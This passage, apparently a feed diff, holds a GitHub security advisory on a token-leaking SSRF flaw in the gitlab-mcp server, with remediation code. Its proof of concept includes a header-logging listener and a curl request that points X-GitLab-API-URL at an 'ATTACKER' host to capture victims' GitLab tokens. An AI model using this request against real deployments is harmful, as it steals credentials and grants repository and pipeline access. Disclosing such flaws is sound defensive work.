-<pre><code class="language-typescript">const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
-if (ENABLE_DYNAMIC_API_URL &amp;&amp; dynamicApiUrl) {
-  new URL(dynamicApiUrl);                          // syntax-only check
-  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);   // any reachable host accepted
-}
-</code></pre>
-<p>In both cases, <code>apiUrl</code> propagates through <code>getEffectiveApiUrl()</code> and into
-<code>getFetchConfig()</code>, which attaches <code>Private-Token: &lt;victim_token&gt;</code> to every
-outbound fetch. The token reaches the attacker's host, not GitLab.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Run upstream <code>zereight/gitlab-mcp</code> at commit <code>74a8c83</code> with
-<code>ENABLE_DYNAMIC_API_URL=true</code> and <code>REMOTE_AUTHORIZATION=true</code>.</p>
-<pre><code class="language-bash"># 1. Start a listener on the attacker host (port 9099)
-#    Any HTTP server that logs incoming headers will work.
-python3 -c "
-import http.server, sys
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        print('HEADERS:', dict(self.headers))
-        self.send_response(200); self.end_headers()
-http.server.HTTPServer(('0.0.0.0', 9099), H).serve_forever()
-"
-
-# 2. Send any MCP tool call with the malicious header
-curl -X POST http://TARGET:3002/mcp \
-  -H "X-GitLab-API-URL: http://ATTACKER:9099/api/v4" \
-  -H "Authorization: Bearer ANY_VALID_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"list_issues","arguments":{"project_id":"1"}},"id":1}'
-</code></pre>
-<p>The listener receives:</p>
-<pre><code>GET /api/v4/projects/1/issues HTTP/1.1
-private-token: &lt;VICTIM_GITLAB_TOKEN&gt;
-Host: ATTACKER:9099
-</code></pre>
-<p>The victim's token arrives at the attacker host. The attacker never needed it
-in advance. The MCP server delivered it.</p>
-<h2 id="impact">Impact</h2>
-<p>The attacker obtains the victim's GitLab Personal Access Token or CI/CD job
-token in a single request. With the stolen token they gain full GitLab API
-access at the victim's permission level: read of all repositories, issues,
-merge requests, CI/CD pipeline definitions and variables/secrets; write to push
-code, modify pipelines, create or delete resources, and rotate CI/CD variables.</p>
-<p>CVSS factors:</p>
-<ul>
-<li><code>PR:L</code>: reaching the HTTP transport requires presenting some auth token</li>
-<li><code>S:C</code>: the attack crosses the boundary into GitLab (a separate security domain)</li>
-<li><code>C:H</code>: victim's GitLab token stolen in one request; full read of all scoped data</li>
-<li><code>I:H</code>: attacker can push code and modify pipelines with the stolen token</li>
-<li><code>A:N</code>: the MCP server continues operating normally</li>
-</ul>
-<h2 id="why-this-is-a-vulnerability-not-intended-behavior">Why This Is a Vulnerability, Not Intended Behavior</h2>
-<p><code>ENABLE_DYNAMIC_API_URL</code> is documented for supporting self-hosted GitLab
-instances at a non-default base URL. The intended caller behavior is to supply
-the URL of their own GitLab instance. The feature has no mechanism to distinguish
-a legitimate self-hosted GitLab URL from an attacker-controlled host. Once
-enabled, every request that includes <code>X-GitLab-API-URL</code> can redirect the server's
-credential-carrying outbound calls to any reachable host with no restriction.</p>
-<p>PR #453 (merged) added a startup guard that blocks the Streamable HTTP transport
-from running with static tokens unless <code>REMOTE_AUTHORIZATION=true</code> or OAuth is
-configured. That guard runs once at server startup and checks transport
-configuration. It does not modify <code>parseAuthHeaders</code>, does not validate
-<code>X-GitLab-API-URL</code>, and does not restrict the token-forwarding path at runtime.
-The SSRF sink at <code>index.ts:11787</code> is unchanged in the current code and fully
-reachable in the documented multi-user deployment mode (<code>REMOTE_AUTHORIZATION=true</code>).</p>
-<h2 id="remediation">Remediation</h2>
-<p>Validate <code>X-GitLab-API-URL</code> against a configurable allowlist of trusted GitLab
-hostnames before assigning the value to <code>apiUrl</code>. Reject any request whose
-<code>X-GitLab-API-URL</code> hostname is not in the allowlist. Apply this check at both
-<code>index.ts:11541</code> and <code>index.ts:11787</code>.</p>
-<p>Example fix for the Streamable HTTP handler:</p>
-<pre><code class="language-typescript">const ALLOWED_HOSTS = (process.env.GITLAB_ALLOWED_HOSTS ?? "")
-  .split(",").map(h =&gt; h.trim()).filter(Boolean);
-
-const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
-if (ENABLE_DYNAMIC_API_URL &amp;&amp; dynamicApiUrl) {
-  const parsed = new URL(dynamicApiUrl);
-  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
-    throw new Error(`X-GitLab-API-URL hostname not in allowlist: ${parsed.hostname}`);
-  }
-  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);
-}
-</code></pre>
-<p>Document <code>GITLAB_ALLOWED_HOSTS</code> in the README alongside <code>ENABLE_DYNAMIC_API_URL</code>.
-If maintaining an allowlist is not feasible, disable <code>ENABLE_DYNAMIC_API_URL</code> by
-default and document the token-forwarding risk prominently.</p>
-<h2 id="credit">Credit</h2>
-<p>Reported via GitHub Security Advisory on 2026-06-07.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-2h44-8472-frjj">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-2h44-8472-frjj</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/pull/625">https://github.com/zereight/gitlab-mcp/pull/625</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/commit/6ffb4cc70706fd05b1ab80901676bc2998b6db6d">https://github.com/zereight/gitlab-mcp/commit/6ffb4cc70706fd05b1ab80901676bc2998b6db6d</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27</a></li>
-<li><a href="https://github.com/advisories/GHSA-2h44-8472-frjj">https://github.com/advisories/GHSA-2h44-8472-frjj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2h44-8472-frjj</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-15T20:57:28.000Z</published>
     </entry>
 </feed>
